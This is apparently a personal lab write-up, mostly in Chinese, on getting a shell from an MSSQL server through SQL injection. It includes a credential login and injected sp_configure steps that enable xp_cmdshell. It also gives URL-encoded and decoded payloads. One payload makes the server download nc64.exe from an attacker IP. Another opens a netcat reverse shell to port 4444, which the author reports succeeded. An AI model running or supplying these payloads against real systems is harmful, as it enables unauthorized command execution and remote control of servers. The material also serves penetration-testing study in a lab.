```
impacket-mssqlclient raj:'Password@1'@192.168.31.126 -windows-auth
```


```
enable_xp_cmdshell
```

https://blog.csdn.net/xiaochan_sara/article/details/149207462

how to get a shell from msssql

測試了幾個 ' 後面接指令都沒有成功顯示，這是基於 MySQL 的 SQL Injection 測試

因為 MSSQL 的測試需要使用 EXECUTE 指令來調用而不是 SELECT

且測試相關指令前一定都要先執行標準四步驟開啟 xp_cmdshell

- **EXECUTE sp_configure 'show advanced options', 1;  --> 啟用高級選項**
- **RECONFIGURE;  --> 套用更改的設定到運行的環境配置**
- **EXECUTE sp_configure 'xp_cmdshell', 1;  --> 啟用 xp_cmdshell**
- **RECONFIGURE;  --> 套用更改的設定到運行的當前配置** 
- **測試 EXECUTE xp_cmdshell 'whoami';  --> 若成功則可以開始下指令了**

所以依序在網頁輸入上述四個指令

';EXECUTE sp_configure 'show advanced options', 1;

';RECONFIGURE;

';EXECUTE sp_configure 'xp_cmdshell', 1;

';RECONFIGURE; 

開啟用執行 dir、whoami、ping 都沒有結果，但是測試 powershell 抓檔案時有反應

最後是使用如下的指令

  

%27%3B%20exec%20master..xp_cmdshell%20%27powershell%20-command%20Invoke-WebRequest%20-Uri%20http%3A%2F%2F192.168.45.179%2Ftools%2Fnc64.exe%20-Outfile%20C%3A%5C%5Ctemp%5C%5Cnc64.exe%27--  

可以看到有來抓檔案

PS : 指令 decode 如下

'; exec master..xp_cmdshell 'powershell -command Invoke-WebRequest -Uri http://192.168.45.179/tools/nc64.exe -Outfile C:\\temp\\nc64.exe'--

接著執行 nc64.exe 來建立連線試試看

指令 : '; exec master..xp_cmdshell 'c:\\temp\\nc64.exe 192.168.45.179 4444 -e powershell'--

URL encode : %27%3B%20exec%20master..xp_cmdshell%20%27c%3A%5C%5Ctemp%5C%5Cnc64.exe%20192.168.45.179%204444%20-e%20powershell%27--

可以看到 4444 Listener 進來了

後來有嘗試另外一種指令

指令 : '; exec master.dbo.xp_cmdshell 'c:\\temp\\nc64.exe 192.168.45.179 4444 -e powershell';--

URL encode : '%3b%20exec%20master.dbo.xp_cmdshell%20'c%3a%5c%5ctemp%5c%5cnc64.exe%20192.168.45.179%204444%20-e%20powershell'%3b--

一樣有成功，4444 Listener 也有進來
https://your-it-note.blogspot.com/2024/05/challenge-1-medtech1.html
